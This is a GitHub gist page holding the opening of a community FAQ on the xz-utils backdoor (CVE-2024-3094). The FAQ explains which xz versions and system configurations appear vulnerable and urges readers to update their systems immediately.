        <button href="https://desktop.github.com" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;OPEN_IN_DESKTOP&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129358846,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="0f52625d24f216b9ef349780c6d428e457913a8d7bdca1fe0cbcce130e9b6444" data-platforms="windows,mac" id="icon-button-f8ca760c-21a4-48d2-bd3c-68c6252bea3c" aria-labelledby="tooltip-701a4521-bdcc-4c81-89a7-14431e0f54b8" type="button" data-view-component="true" class="Button Button--iconOnly Button--secondary Button--small js-remove-unless-platform">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-desktop-download Button-visual">
    <path d="m4.927 5.427 2.896 2.896a.25.25 0 0 0 .354 0l2.896-2.896A.25.25 0 0 0 10.896 5H8.75V.75a.75.75 0 1 0-1.5 0V5H5.104a.25.25 0 0 0-.177.427Z"></path><path d="M1.573 2.573a.25.25 0 0 0-.073.177v7.5a.25.25 0 0 0 .25.25h12.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25h-3a.75.75 0 1 1 0-1.5h3A1.75 1.75 0 0 1 16 2.75v7.5A1.75 1.75 0 0 1 14.25 12h-3.727c.099 1.041.52 1.872 1.292 2.757A.75.75 0 0 1 11.25 16h-6.5a.75.75 0 0 1-.565-1.243c.772-.885 1.192-1.716 1.292-2.757H1.75A1.75 1.75 0 0 1 0 10.25v-7.5A1.75 1.75 0 0 1 1.75 1h3a.75.75 0 0 1 0 1.5h-3a.25.25 0 0 0-.177.073ZM6.982 12a5.72 5.72 0 0 1-.765 2.5h3.566a5.72 5.72 0 0 1-.765-2.5H6.982Z"></path>
</svg>
</button><tool-tip id="tooltip-701a4521-bdcc-4c81-89a7-14431e0f54b8" for="icon-button-f8ca760c-21a4-48d2-bd3c-68c6252bea3c" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Save thesamesam/223949d5a074ebc3dce9ee78baad9e27 to your computer and use it in GitHub Desktop.</tool-tip>


    </li>
  </ul>

<div class="d-flex flex-md-row flex-column px-0 pr-md-3 px-lg-5">
  <div class="flex-md-order-1 flex-order-2 flex-auto">
    <nav class="UnderlineNav box-shadow-none px-3 px-lg-0"
     aria-label="Gist"
     data-pjax="#gist-pjax-container">

  <div class="UnderlineNav-body">
    <a class="js-selected-navigation-item selected UnderlineNav-item" data-pjax="true" data-hotkey="g c" aria-current="page" data-selected-links="gist_code /thesamesam/223949d5a074ebc3dce9ee78baad9e27" href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code UnderlineNav-octicon">
    <path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path>
</svg>
      Code
</a>
      <a class="js-selected-navigation-item UnderlineNav-item" data-pjax="true" data-hotkey="g r" data-selected-links="gist_revisions /thesamesam/223949d5a074ebc3dce9ee78baad9e27/revisions" href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/revisions">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-git-commit UnderlineNav-octicon">
    <path d="M11.93 8.5a4.002 4.002 0 0 1-7.86 0H.75a.75.75 0 0 1 0-1.5h3.32a4.002 4.002 0 0 1 7.86 0h3.32a.75.75 0 0 1 0 1.5Zm-1.43-.75a2.5 2.5 0 1 0-5 0 2.5 2.5 0 0 0 5 0Z"></path>
</svg>
        Revisions
        <span title="171" data-view-component="true" class="Counter">171</span>
</a>
      <a class="js-selected-navigation-item UnderlineNav-item" data-pjax="true" data-hotkey="g s" data-selected-links="gist_stars /thesamesam/223949d5a074ebc3dce9ee78baad9e27/stargazers" href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/stargazers">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star UnderlineNav-octicon">
    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
</svg>
        Stars
        <span title="1,343" data-view-component="true" class="Counter">1,343</span>
</a>
      <a class="js-selected-navigation-item UnderlineNav-item" data-pjax="true" data-hotkey="g f" data-selected-links="gist_forks /thesamesam/223949d5a074ebc3dce9ee78baad9e27/forks" href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/forks">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-git-branch UnderlineNav-octicon">
    <path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path>
</svg>
        Forks
        <span title="64" data-view-component="true" class="Counter">64</span>
</a>  </div>
</nav>

  </div>

  <div class="d-md-flex d-none flex-items-center flex-md-order-2 flex-order-1" data-multiple>
    
<div data-view-component="true" class="flex-items-center d-inline-flex">
  <action-menu data-menu-input="gist-share-url-original" data-select-variant="single" data-dynamic-label="" data-view-component="true" class="flex-shrink-0">
  <focus-group direction="vertical" mnemonics retain>
    <button id="action-menu-ac06d4d6-4459-4961-b36c-6593acca80e8-button" popovertarget="action-menu-ac06d4d6-4459-4961-b36c-6593acca80e8-overlay" aria-controls="action-menu-ac06d4d6-4459-4961-b36c-6593acca80e8-list" aria-haspopup="true" type="button" data-view-component="true" class="rounded-right-0 border-right-0 Button--secondary Button--small Button">  <span class="Button-content">
    <span class="Button-label">Embed</span>
  </span>
    <span class="Button-visual Button-trailingAction">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
    </span>
</button>


<anchored-position data-target="action-menu.overlay" id="action-menu-ac06d4d6-4459-4961-b36c-6593acca80e8-overlay" anchor="action-menu-ac06d4d6-4459-4961-b36c-6593acca80e8-button" align="start" side="outside-bottom" anchor-offset="normal" popover="auto" data-view-component="true">
  <div data-view-component="true" class="Overlay Overlay--size-auto">
    
      <div data-view-component="true" class="Overlay-body Overlay-body--paddingNone">          <action-list>
  <div data-view-component="true">
    <ul aria-labelledby="action-menu-ac06d4d6-4459-4961-b36c-6593acca80e8-button" id="action-menu-ac06d4d6-4459-4961-b36c-6593acca80e8-list" role="menu" data-view-component="true" class="ActionListWrap--inset ActionListWrap">
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="&lt;script src=&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27.js&quot;&gt;&lt;/script&gt;" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;EMBED&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129358846,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="8eae7b1cd4839d3791511267adbdcce0b28aed35d02e1715ce131ea2c1ce1374" id="item-816fc39d-f608-4c2d-aca5-ec4731134e71" type="button" role="menuitemradio" aria-checked="true" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
           Embed
</span>      <span data-view-component="true" class="ActionListItem-description">Embed this gist in your website.</span>
</span></button>
  
</li>
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;SHARE&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129358846,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="25a26325f5723ac6737ffc067e3a7a8db6bab8480341cd2f8c0221baedaa73fc" id="item-bdd9fc5e-83e2-46e9-b559-20e5ed0f3425" type="button" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
           Share
</span>      <span data-view-component="true" class="ActionListItem-description">Copy sharable link for this gist.</span>
</span></button>
  
</li>
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="https://gist.github.com/223949d5a074ebc3dce9ee78baad9e27.git" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;USE_HTTPS&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129358846,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="b23a462368870b567c5577647050841a46ecd6f73d44c0eddf3e122a853b342e" id="item-b284f2e7-e3fe-479d-8b95-5eb4684fe8d0" type="button" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
          Clone via HTTPS
</span>      <span data-view-component="true" class="ActionListItem-description">Clone using the web URL.</span>
</span></button>
  
</li>
        <li role="presentation" aria-hidden="true" data-view-component="true" class="ActionList-sectionDivider"></li>
        <li target="_blank" rel="noopener noreferrer" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-4342ba9b-811a-4ff3-a025-06900603cea6" href="https://docs.github.com/articles/which-remote-url-should-i-use" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-question">
    <path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.92 6.085h.001a.749.749 0 1 1-1.342-.67c.169-.339.436-.701.849-.977C6.845 4.16 7.369 4 8 4a2.756 2.756 0 0 1 1.637.525c.503.377.863.965.863 1.725 0 .448-.115.83-.329 1.15-.205.307-.47.513-.692.662-.109.072-.22.138-.313.195l-.006.004a6.24 6.24 0 0 0-.26.16.952.952 0 0 0-.276.245.75.75 0 0 1-1.248-.832c.184-.264.42-.489.692-.661.103-.067.207-.132.313-.195l.007-.004c.1-.061.182-.11.258-.161a.969.969 0 0 0 .277-.245C8.96 6.514 9 6.427 9 6.25a.612.612 0 0 0-.262-.525A1.27 1.27 0 0 0 8 5.5c-.369 0-.595.09-.74.187a1.01 1.01 0 0 0-.34.398ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
                Learn more about clone URLs

</span>      
</a>
  
</li>
</ul>    
</div></action-list>


</div>
      
</div></anchored-position>  </focus-group>
</action-menu>    <primer-text-field class="FormControl width-full FormControl--fullWidth">
      <label for="gist-share-url-original" class="sr-only FormControl-label">
        Clone this repository at &amp;lt;script src=&amp;quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
</label>    
  <div class="FormControl-input-wrap FormControl-input-wrap--small">
    
      <input id="gist-share-url-original" aria-label="Clone this repository at &amp;lt;script src=&amp;quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;" value="&lt;script src=&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27.js&quot;&gt;&lt;/script&gt;" readonly="readonly" data-autoselect="true" data-target="primer-text-field.inputElement " aria-describedby="validation-b2f3d701-a7cb-48b2-986a-73e8bf5a5a3d" class="form-control FormControl-monospace FormControl-input FormControl-small rounded-left-0 rounded-right-0 border-right-0" type="text" name="gist-share-url-original" />
</div>
      <div class="FormControl-inlineValidation" id="validation-b2f3d701-a7cb-48b2-986a-73e8bf5a5a3d" hidden="hidden">
  <span class="FormControl-inlineValidation--visual" data-target="primer-text-field.validationSuccessIcon" hidden><svg aria-hidden="true" height="12" viewBox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-check-circle-fill">
    <path d="M6 0a6 6 0 1 1 0 12A6 6 0 0 1 6 0Zm-.705 8.737L9.63 4.403 8.392 3.166 5.295 6.263l-1.7-1.702L2.356 5.8l2.938 2.938Z"></path>
</svg></span>
  <span class=" FormControl-inlineValidation--visual" data-target="primer-text-field.validationErrorIcon"><svg aria-hidden="true" height="12" viewBox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-alert-fill">
    <path d="M4.855.708c.5-.896 1.79-.896 2.29 0l4.675 8.351a1.312 1.312 0 0 1-1.146 1.954H1.33A1.313 1.313 0 0 1 .183 9.058ZM7 7V3H5v4Zm-1 3a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z"></path>
</svg></span>
  <span></span>
</div>
    
</primer-text-field>
  <span data-view-component="true">
  <clipboard-copy id="clipboard-button" aria-label="Copy" for="gist-share-url-original" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;COPY_URL&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129358846,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="501cdd4a2cdcefe7e7ce3067f62d0a42d715b9263c1506ab93c54677df3e3ff2" type="button" data-view-component="true" class="rounded-left-0 Button--secondary Button--small Button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg style="display: none;" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check color-fg-success">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>

</div>

    <div class="ml-2">
        <button href="https://desktop.github.com" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;OPEN_IN_DESKTOP&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129358846,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="0f52625d24f216b9ef349780c6d428e457913a8d7bdca1fe0cbcce130e9b6444" data-platforms="windows,mac" id="icon-button-7252fa5c-49b9-45a3-accc-8f99dc146c66" aria-labelledby="tooltip-cbf3ba2b-6891-4bde-8212-0a43b642d5cf" type="button" data-view-component="true" class="Button Button--iconOnly Button--secondary Button--small js-remove-unless-platform">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-desktop-download Button-visual">
    <path d="m4.927 5.427 2.896 2.896a.25.25 0 0 0 .354 0l2.896-2.896A.25.25 0 0 0 10.896 5H8.75V.75a.75.75 0 1 0-1.5 0V5H5.104a.25.25 0 0 0-.177.427Z"></path><path d="M1.573 2.573a.25.25 0 0 0-.073.177v7.5a.25.25 0 0 0 .25.25h12.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25h-3a.75.75 0 1 1 0-1.5h3A1.75 1.75 0 0 1 16 2.75v7.5A1.75 1.75 0 0 1 14.25 12h-3.727c.099 1.041.52 1.872 1.292 2.757A.75.75 0 0 1 11.25 16h-6.5a.75.75 0 0 1-.565-1.243c.772-.885 1.192-1.716 1.292-2.757H1.75A1.75 1.75 0 0 1 0 10.25v-7.5A1.75 1.75 0 0 1 1.75 1h3a.75.75 0 0 1 0 1.5h-3a.25.25 0 0 0-.177.073ZM6.982 12a5.72 5.72 0 0 1-.765 2.5h3.566a5.72 5.72 0 0 1-.765-2.5H6.982Z"></path>
</svg>
</button><tool-tip id="tooltip-cbf3ba2b-6891-4bde-8212-0a43b642d5cf" for="icon-button-7252fa5c-49b9-45a3-accc-8f99dc146c66" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Save thesamesam/223949d5a074ebc3dce9ee78baad9e27 to your computer and use it in GitHub Desktop.</tool-tip>


    </div>

    <div class="ml-2">
      <a class="btn btn-sm" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;DOWNLOAD_ZIP&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:129358846,&quot;originating_url&quot;:&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="96c2921c03dab00f1dbf8ca778844a84cb504ec0d8c71f394a34c70e5a366fe4" data-ga-click="Gist, download zip, location:gist overview" href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/archive/229a2e0548b629b6154eac6ddc52f33b85ce4c9a.zip">Download ZIP</a>
    </div>
  </div>
</div>


  </div>
</div>

<div class="container-lg px-3">
  <div class="repository-content gist-content" >
    
  <div>
      <div itemprop="about">
    xz-utils backdoor situation (CVE-2024-3094)
  </div>

        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-xz-backdoor-md" class="file my-2">
      <div class="file-header d-flex flex-md-items-center flex-items-start">
        <div class="file-actions flex-order-2 pt-0">
          <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/raw/229a2e0548b629b6154eac6ddc52f33b85ce4c9a/xz-backdoor.md" data-view-component="true" class="Button--secondary Button--small Button">  <span class="Button-content">
    <span class="Button-label">Raw</span>
  </span>
</a>

        </div>
        <div class="file-info pr-4 d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
          <span class="mr-1">
            <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code-square color-fg-muted">
    <path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25Zm7.47 3.97a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L10.69 8 9.22 6.53a.75.75 0 0 1 0-1.06ZM6.78 6.53 5.31 8l1.47 1.47a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215l-2-2a.75.75 0 0 1 0-1.06l2-2a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"></path>
</svg>
          </span>
          <a class="wb-break-all" href="#file-xz-backdoor-md">
            <strong class="user-select-contain gist-blob-name css-truncate-target">
              xz-backdoor.md
            </strong>
          </a>
        </div>
      </div>
      <div id="file-xz-backdoor-md-readme" class="Box-body readme blob p-5 p-xl-6 gist-border-0">
    <article class="markdown-body entry-content container-lg" itemprop="text"><div class="markdown-heading" dir="auto"><h1 class="heading-element" dir="auto">FAQ on the xz-utils backdoor (CVE-2024-3094)</h1><a id="user-content-faq-on-the-xz-utils-backdoor-cve-2024-3094" class="anchor" aria-label="Permalink: FAQ on the xz-utils backdoor (CVE-2024-3094)" href="#faq-on-the-xz-utils-backdoor-cve-2024-3094"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">This is a living document. Everything in this document is made in good
faith of being accurate, but like I just said; we don't yet know everything
about what's going on.</p>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Background</h2><a id="user-content-background" class="anchor" aria-label="Permalink: Background" href="#background"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">On March 29th, 2024, a backdoor was discovered in
<a href="https://tukaani.org/xz/" rel="nofollow">xz-utils</a>, a suite of software that
gives developers lossless compression. This package is commonly used
for compressing release tarballs, software packages, kernel images,
and initramfs images. It is very widely distributed, statistically
your average Linux or macOS system will have it installed for
convenience.</p>
<p dir="auto">This backdoor is very indirect and only shows up when a few <em>known</em> specific
criteria are met. Others may be yet discovered! However, this backdoor is <em>at least</em>
triggerable by remote unprivileged systems connecting to public SSH ports. This has been
seen in the wild where it gets activated by connections - resulting in performance
issues, but we do not know yet what is required to bypass authentication (etc) with it.</p>
<p dir="auto">We're reasonably sure the following things need to be true for your system
to be vulnerable:</p>
<ul dir="auto">
<li>You need to be running a distro that uses glibc (for IFUNC)</li>
<li>You need to have versions 5.6.0 or 5.6.1 of xz or liblzma installed
(xz-utils provides the library liblzma) - likely only true if
running a rolling-release distro and updating religiously.</li>
</ul>
<p dir="auto">We know that the combination of <em>systemd</em> and <em>patched openssh</em> are
vulnerable but pending further analysis of the payload, we cannot
be certain that other configurations aren't.</p>
<p dir="auto">While not scaremongering, it is important to be clear that <strong>at this stage,
we got lucky, and there may well be other effects of the infected liblzma</strong>.</p>
<p dir="auto">If you're running a publicly accessible <code>sshd</code>, then you are - as a rule
of thumb for those not wanting to read the rest here - likely vulnerable.</p>
<p dir="auto">If you aren't, it is unknown for now, but you should update as quickly as possible
because investigations are continuing.</p>
<p dir="auto">TL:DR:</p>
<ul dir="auto">
<li>Using a <code>.deb</code> or <code>.rpm</code> based distro with glibc and xz-5.6.0 or xz-5.6.1:
<ul dir="auto">
<li>Using systemd on publicly accessible ssh: update RIGHT NOW NOW NOW</li>
<li>Otherwise: update RIGHT NOW NOW but prioritize the former</li>
</ul>
</li>
<li>Using another type of distribution:
<ul dir="auto">
<li>With glibc and xz-5.6.0 or xz-5.6.1: update RIGHT NOW, but prioritize the above.</li>
</ul>
</li>
</ul>
<p dir="auto">If all of these are the case, please update your systems to mitigate
this threat. For more information about affected systems and how to
update, please see <a href="https://xeiaso.net/notes/2024/xz-vuln/" rel="nofollow">this
article</a> or check the
<a href="https://repology.org/project/xz/versions" rel="nofollow">xz-utils page on Repology</a>.</p>
<p dir="auto">This is not a fault of sshd, systemd, or glibc, that is just how it
was made exploitable.</p>
